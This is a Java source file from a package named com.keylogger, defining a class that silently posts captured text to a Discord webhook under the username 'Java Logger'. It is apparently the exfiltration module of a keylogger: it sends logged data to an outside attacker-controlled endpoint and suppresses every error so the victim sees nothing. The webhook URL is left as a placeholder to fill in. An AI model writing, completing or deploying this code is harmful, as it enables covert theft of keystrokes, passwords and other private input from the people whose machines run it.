package com.keylogger;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DiscordWebhook {
    private static final String WEBHOOK_URL = "Your webhook url";
    
    public static void send(String message) {
        if (message == null || message.trim().isEmpty()) return;
        
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            String json = "{\"content\":\"" + message + "\",\"username\":\"Java Logger\"}";
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
        }
    }
}